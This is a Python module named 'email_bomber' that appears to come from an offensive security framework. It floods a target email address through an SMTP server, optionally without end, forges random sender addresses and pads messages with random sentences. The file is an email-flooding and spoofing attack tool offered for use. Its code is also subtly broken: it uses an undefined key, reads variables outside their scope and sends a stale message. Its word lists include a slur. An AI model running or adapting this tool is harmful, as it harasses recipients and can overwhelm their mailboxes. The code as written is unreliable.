#		Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
from core import colors
from collections import OrderedDict
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket
import random
from string import ascii_lowercase

conf = {
	"name": "email_bomber",
	"version": "1.0",
	"shortdesc": "spam email to target email",
	"author": "4shadoww",
	"github": "4shadoww",
	"email": "4shadoww0@gmail.com"
}

# List of the variables
variables = OrderedDict((
	('my_username', 'username'),
	('my_password', 'yourpassword'),
	('smtp', 'smtp.server.com'),
	('smtp_port', 587),
	('from_email', 'from@email.com'),
	('to_email', 'target@email.com'),
	('subject', 'hello'),
	('message', 'im email bomber'),
	('amount', 1),
	('starttls', 0),
	('login', 0),
	('random_email', 1),
	('random_message', 1),
))

# Description for variables
vdesc = [
	'username for login',
	'password for login',
	'smtp server',
	'smtp server port(must be int)',
	'from email',
	'to email',
	'subject',
	'message',
	'amount of emails(0 = infinite/must be int)',
	'use starttls(0 = no/1 =yes)',
	'use login(0 = no/1 = yes)',
	'generate random email(0 = no/1 = yes)',
	'generate random message(0 = no/1 = yes)',
]

s_nouns = ["A dude", "My mom", "The king", "Some guy", "A cat with rabies", "A sloth", "Your homie", "This cool guy my gardener met yesterday", "Superman", "Super Mario", "Human", "Robot", "Boy", "Girl"]
p_nouns = ["These dudes", "Both of my moms", "All the kings of the world", "Some guys", "All of a cattery's cats", "The multitude of sloths living under your bed", "Your homies", "Like, these, like, all these people", "Supermen"]
s_verbs = ["eats", "kicks", "gives", "treats", "meets with", "creates", "hacks", "configures", "spies on", "retards", "meows on", "flees from", "tries to automate", "explodes", "writes", "tease"]
p_verbs = ["eat", "kick", "give", "treat", "meet with", "create", "hack", "configure", "spy on", "retard", "meow on", "flee from", "try to automate", "explode"]
infinitives = ["to make a pie.", "for no apparent reason.", "because the sky is green.", "for a disease.", "to be able to make toast explode.", "to know more about archeology.", "because the sky is blue"]

option_notes = colors.yellow+" this module will not work with gmail, yahoo, yandex\n please run your own smtp!"+colors.end
# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	fromaddr = variables['my_username']
	toaddr = variables['to_email']
	msg = MIMEMultipart()
	msg['From'] = variables['from_email']
	msg['To'] = variables['to_email']
	msg['Subject'] = variables['subject']

	domains = [ "hotmail.com", "gmail.com", "aol.com", "mail.com" , "mail.kz", "yahoo.com"]
	letters = ascii_lowercase[:12]

	body = variables['message']
	msg.attach(MIMEText(body, 'html'))
	try:
		server = smtplib.SMTP(variables['smtp'], int(variables['smtp_port']))
	except(ValueError):
		print(colors.red+"error: port number must be int"+colors.end)
		return
	except socket.gaierror:
		print(colors.red+"error: cannot reach smtp server"+colors.end)
		return
	except(ConnectionRefusedError):
		print(colors.red+"error: connection refused"+colors.end)
		return
	except(TimeoutError):
		print(colors.red+"error: timeout cannot reach smtp server"+colors.end)
		return
	if int(variables['starttls']) == 1:
		server.starttls()
	if int(variables['login']) == 1:
		server.login(fromaddr, variables['my_password'])
	text = msg.as_string()

	if int(variables['amount']) > 0:
		for i in range(0, int(variables['amount'])):
				if int(variables['random_email'] == 1):
					fakemail = generate_random_email()
					msg['From'] = fakemail[0]
				if int(variables['random_messagem']) == 1:
					list0 = random.choice(s_nouns), random.choice(s_verbs), random.choice(s_nouns).lower() or random.choice(p_nouns).lower(), random.choice(infinitives)
					words = " ".join(list0)
					msg.attach(MIMEText(words, 'html'))
				server.sendmail(fromaddr, toaddr, text)
				print(colors.green+"email sended"+colors.end)

	if int(variables['amount']) == 0:
		print(colors.yellow+'starting infinite loop (ctrl+c) to end')
		while True:
			if int(variables['random_email']) == 1:
					fakemail = generate_random_email()
					msg['From'] = fakemail[0]
			if int(variables['random_messagem']) == 1:
					list0 = random.choice(s_nouns), random.choice(s_verbs), random.choice(s_nouns).lower() or random.choice(p_nouns).lower(), random.choice(infinitives)
					words = " ".join(list0)
					msg.attach(MIMEText(words, 'html'))
			server.sendmail(fromaddr, toaddr, text)
			print(colors.green+"email sended"+colors.end)
	server.quit()

def get_random_domain(domains):
	return random.choice(domains)

def get_random_name(letters, length):
	return ''.join(random.choice(letters) for i in range(length))

def generate_random_email():
	return [get_random_name(letters, 8) + '@' + get_random_domain(domains) for i in range(1)]